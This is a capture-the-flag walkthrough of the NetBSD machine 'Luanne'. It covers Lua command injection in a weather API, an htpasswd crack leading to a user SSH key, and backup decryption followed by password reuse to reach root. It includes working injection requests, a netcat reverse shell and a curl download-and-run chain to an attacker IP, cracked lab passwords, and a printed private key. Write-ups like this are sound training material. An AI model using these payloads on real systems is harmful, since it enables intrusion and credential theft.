# Luanne
```
Difficulty: Easy
Operating System: NetBSD
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `_httpd` | Lua Command Injection | Discovered a hidden directory `/weather/forecast` on port 80. Fuzzing the `city` parameter with special characters revealed a Lua error. By using the payload `');os.execute("sleep+5")--`, I was able to confirm blind command injection. Leveraged this vulnerability to download a reverse shell script, set its permissions, and execute it using `sh`, gaining a shell as the `_httpd` user. |
| 2 | `r.michaels` | Internal Web Server & SSH Key Retrieval | While enumerating the system as `_httpd`, I found an internal web server running on `127.0.0.1:3001` as user `r.michaels`. The server was configured to serve a user's `public_html` directory via the `-u` flag. The web server required basic authentication, and I cracked the password hash from `/var/www/.htpasswd`. This gave me a password to access the internal web server, where I found and downloaded `r.michaels`'s SSH key. Logged into the machine as `r.michaels` via SSH. |
| 3 | `root` | PGP Backup Decryption & Password Reuse | Found an encrypted backup file `devel_backup-2020-09-16.tar.gz.enc` in the `r.michaels` home directory. Identified that NetBSD's `netpgp` tool was available and that there was a key fingerprint associated with `r.michaels`. Used `netpgp` to decrypt the backup file, which contained a different `.htpasswd` file. Cracked this new hash to find a new password. Used this password with `doas sh` to escalate privileges to `root`, as `r.michaels` was a `doas` user. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
|_http-server-header: nginx/1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-server-header: Medusa/1.12
|_http-title: Error response
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
```
As we can see this host is runnning NetBSD. As we can see on both port 80 and 9001 the service is requesting authentication, hence, we can see the response header ```401 Unauthorized``` .  
As we can see there's also a ```robots.txt``` file with a disallowed entry `/weather`
so let's dig into this.  
As we open the `/weather` page we get a 404 not found.  
Before moving our enumeration somewhere else, let's dig deeper into this directory.  
If we run directory enumeration against weather, we can see the following:  
```bash
/forecast             (Status: 200) [Size: 90]
```
if we open this page we can see the following response:  
```json
{"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}
```
so now we have a parameter to fuzz this api.  
Now we can use `ffuf` to fuzz this API and see if we get some strange response code from the application.  
To do so we can use a special characters list available under: `/usr/share/wordlists/seclists/Fuzzing/special-chars.txt` 
Special characters are a good starting point to fuzz an applications, since it may happens that application trigger some error that discloses some information about how the application works.  
```bash
[root@kali Luanne ]$ ffuf -u 'http://10.10.10.218/weather/forecast?city=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -fw 5                                                                                               

        /'___\  /'___\           /'___\                    
       /\ \__/ /\ \__/  __  __  /\ \__/                    
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                   
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                   
         \ \_\   \ \_\  \ \____/  \ \_\                    
          \/_/    \/_/   \/___/    \/_/                    

       v1.5.0 Kali Exclusive <3                            
________________________________________________           

 :: Method           : GET                                 
 :: URL              : http://10.10.10.218/weather/forecast?city=FUZZ                                                 
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/special-chars.txt                                  
 :: Follow redirects : false                               
 :: Calibration      : false                               
 :: Timeout          : 10                                  
 :: Threads          : 40                                  
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500                                           
 :: Filter           : Response words: 5                   
________________________________________________           

'                       [Status: 500, Size: 77, Words: 9, Lines: 2, Duration: 107ms]                                  
%                       [Status: 200, Size: 90, Words: 12, Lines: 2, Duration: 108ms]                                 
+                       [Status: 500, Size: 40, Words: 6, Lines: 1, Duration: 111ms]                                  
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: 
```
as we can see there are some characters that are forceing the application to get a different response.  
We can analyse each carachter and see that using `'` caouse the application to throw the following error:  
```
<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
```
so now that we got the error, we need to poke around on google and see how comments are made in lua, so that we can exclude the final part of the code of being executed.  
Poking around, we can discover that the lua comments are made via `--` now let's try to provide this two dashes to the input.  
as we can notice, as a response we do get the same error described above.  
Now, let's try to use `ffuf` again and see what specia char allow the application to continue without breaking into an error.  
```
[root@kali Luanne ]$ ffuf -u "http://10.10.10.218/weather/forecast?city='FUZZ--" -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -fw 9                                                                                            

        /'___\  /'___\           /'___\                    
       /\ \__/ /\ \__/  __  __  /\ \__/                    
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                   
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                   
         \ \_\   \ \_\  \ \____/  \ \_\                    
          \/_/    \/_/   \/___/    \/_/                    

       v1.5.0 Kali Exclusive <3                            
________________________________________________           

 :: Method           : GET                                 
 :: URL              : http://10.10.10.218/weather/forecast?city='FUZZ--                                              
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/special-chars.txt                                  
 :: Follow redirects : false                               
 :: Calibration      : false                               
 :: Timeout          : 10                                  
 :: Threads          : 40                                  
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500                                           
 :: Filter           : Response words: 9                   
________________________________________________           

)                       [Status: 500, Size: 37, Words: 5, Lines: 1, Duration: 58ms]                                   
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
as we can se a closed parenthesis will do the job.  

## Foothold 
Once we discovered how to pass special charachters without breaking the application, we can start crafting our payload.  
First of all, let's check if we can execute code by adding a command in the lua commands chain.  
```
GET /weather/forecast?city=');os.execute("sleep+5")-- HTTP/1.1
Host: 10.10.10.218
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```
As we can notice in the response time, we manage to get the code execution
![](Attachments/03-blind-command-injection.png)
So now, let's start crafting our payload.  
As we can notice the normal bash shell doesn't work with this machine this may be due to the fact that bash is not available in NetBSD systems.  
Since we can use curl, we can create a `shell.sh` file, host it using python, download the file, change the permission and execute the script via `sh` .  
Now, we can craft our payload with the common reverse shell:  
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 9001 >/tmp/f
```
Use the discovered command execution to download this file to `/tmp` .  
```
GET /weather/forecast?city=');os.execute("curl+10.10.14.7/shell.sh+-o+/tmp/shell.sh")-- HTTP/1.1
Host: 10.10.10.218
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0

```
change permission of the file:  
```
GET /weather/forecast?city=');os.execute("chmod+777+/tmp/shell.sh")-- HTTP/1.1
Host: 10.10.10.218
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```
and execute the downloaded shell:  
```
GET /weather/forecast?city=');os.execute("sh+/tmp/shell.sh")-- HTTP/1.1
Host: 10.10.10.218
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```
Once we execute the shell, on our listener we can see that we get a shell as user `_httpd` .
```
root@kali Luanne ]$ bash                                  
root@kali:~/Documents/HTB/Boxes/Luanne# nc -lvnp 9001      
listening on [any] 9001 ...                                
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.218] 65031                                                           
sh: can't access tty; job control turned off               
$ whoami                                                   
_httpd                                                     
$            
```
## User
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that there is an internal web service listening localhost, port 3000 and 3001 as user `r.michaels` 
```bash
╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
_
[... SNIP ...]
r.michaels  185  0.0  0.0  34996  1976 ?     Is    7:07AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/w
ww
root          1  0.0  0.0  19848  1512 ?     Ss    7:07AM 0:00.02 init
```
Now let's enumerate all the flags this process is using by reading [httpd NetBSD Docs](https://man.netbsd.org/NetBSD-9.0/httpd.8) :
* -u Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html
* -X Enables directory indexing.
* -s Forces logging to be set to stderr always
* -i Bind address
* -I Bind port
* -L prefix script: Adds a new Lua script for a particular prefix.
* -P pidfile: Causes httpd to create a pid file in pidfile
* -U username:  switch to the user and the groups of username after initialization.
* -b Enables daemon mode
Now, let's try to leverage the -u flag.  
If we try to curl the webserver we get a 401 error:  
```bash
$ curl http://127.0.0.1:3000/
<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
/: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3000/">127.0.0.1:3000</a></address>
</body></html>
```
Since we have access to the box, it should be asy to lookup the password.  
```bash
$ cat /var/www/.htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```
Now, let's crack it:  
```bash
[root@kali Luanne ]$ john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.txt
arning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamthebest       (webapi_user)     
1g 0:00:00:00 DONE (2022-05-26 10:56) 25.00g/s 76800p/s 76800c/s 76800C/s my3kids..ANTHONY
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now that we got the password we can use it against the local webserver.  
After enumerating port 3000 we do not get anythin, but, if we enumerate port 3001, we can leverage the -b flag we were suspecting being vulnerable:  
```
$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/                                            
<!DOCTYPE html>                                                                                                    
<html><head><meta charset="utf-8"/>                                                                                
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```
Now we can curl the private key:  
```
curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
$  
```
And as we can see we can use this private key to log in into this box as user `r.michaels` .  
```
[root@kali keys ]$ ssh -l r.michaels -i id_rsa_r.michaels $TARGET
Last login: Thu May 26 09:23:27 2022 from 10.10.14.7
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ whoami
r.michaels
luanne$ ls public_html/                                                                                           
id_rsa
```
As we can see the ssh key was located under `public_html/` directory.
## Root
Once we log in we can notice a `backups/` directory that is encrypted.  
Now, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that there are some pgp keys available for this box:  
```
╔══════════╣ Do I have PGP keys?           
gpg Not Found
/usr/bin/netpgpkeys   
1 key found
"pub" 2048/"RSA (Encrypt or Sign)" "3684eb1e5ded454a" 2020-09-14
Key fingerprint: "027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a "
uid              "RSA 2048-bit key <r.michaels@localhost>" ""

/usr/bin/netpgp
```
Hopefully this key can be used to decrypt the backup.  
[PGP Keys](https://gnupg.org/) allows to encrypt and sign your data and communications; it features a versatile key management system, along with access modules for all kinds of public key directories. GnuPG, also known as _GPG_, is a command line tool with features for easy integration with other applications.  
As we can see we do not have `pgp` installed on this box, but as linpeas suggest we can use `netpgp` for the same scope.  
After reading the [netpgp manual](https://man.netbsd.org/netpgp.1), we can run the following command to decrypt the backup:  
```
luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc  --output /tmp/backup.tar.gz                           
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14                                                  
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a                                                 
uid              RSA 2048-bit key <r.michaels@localhost> 
```

if we go inside the extracted backup we can see a backup of the `/var/www` directory, as we can see in this directory the .htpasswd file is different, from the previously discovered one.  
```
luanne$ cat /tmp/devel-2020-09-16/www/.htpasswd                                                                                                                                                                                             
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
luanne$ cat /var/www/.htpasswd                                                                                                                                                                                                              
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```
as we can see the hashes are different, so let's crack the hash again:  
```
[root@kali Luanne ]$ john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd2.txt                                
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"                       
Use the "--format=md5crypt-long" option to force loading these as that type instead                                
Using default input encoding: UTF-8                      
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])                         
Will run 2 OpenMP threads   
Press 'q' or Ctrl-C to abort, almost any other key for status                                                      
littlebear       (webapi_user)                           
1g 0:00:00:00 DONE (2022-05-26 12:00) 14.28g/s 186514p/s 186514c/s 186514C/s jayar..hello11                        
Use the "--show" option to display all of the cracked passwords reliably                                           
Session completed. 
```
Now we found a new password.  
Since this is a NetBSD system we cannot run `su`, we need tu use `doas` .  
```
luanne$ su -
su: You are not listed in the correct secondary group (wheel) to su root.
su: Sorry: Authentication error
luanne$ doas sh
Password:
sh: Cannot determine current working directory
# id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
```
and we get a shell as root